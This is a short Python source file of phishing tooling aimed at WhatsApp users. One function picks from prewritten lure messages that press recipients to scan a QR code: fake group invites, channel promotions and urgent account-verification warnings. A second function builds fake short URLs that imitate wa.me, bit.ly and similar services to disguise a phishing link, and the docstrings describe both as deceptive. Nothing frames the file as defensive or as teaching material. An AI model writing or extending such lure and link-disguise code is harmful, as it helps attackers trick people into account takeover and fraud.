import random
import logging
import string

def generate_lure_message(pretext_type="group_invite"):
    """Generate a convincing lure message based on pretext type."""
    lures = {
        "group_invite": [
            "Join our exclusive WhatsApp group for updates! Scan now: {url}",
            "You're invited to our VIP community! Scan the QR code to join: {url}",
            "Connect with our team on WhatsApp! Scan to access: {url}"
        ],
        "channel_promo": [
            "Unlock premium WhatsApp channel content! Scan to subscribe: {url}",
            "Join our trending WhatsApp channel! Scan now: {url}",
            "Exclusive deals await! Scan to join our channel: {url}"
        ],
        "urgent_login": [
            "Your WhatsApp account needs verification! Scan to secure it: {url}",
            "Action required: Scan the QR code to verify your login: {url}",
            "Protect your account! Scan now to confirm: {url}"
        ]
    }
    message = random.choice(lures.get(pretext_type, lures["group_invite"]))
    logging.info(f"Generated lure message: {message}")
    return message

def generate_short_url(phishing_url):
    """Generate a short, obfuscated URL mimicking a legitimate service."""
    domains = ["wa.me", "bit.ly", "t.ly", "tinyurl.com"]
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    short_url = f"https://{random.choice(domains)}/{random_string}"
    logging.info(f"Generated short URL: {short_url} for {phishing_url}")
    return short_url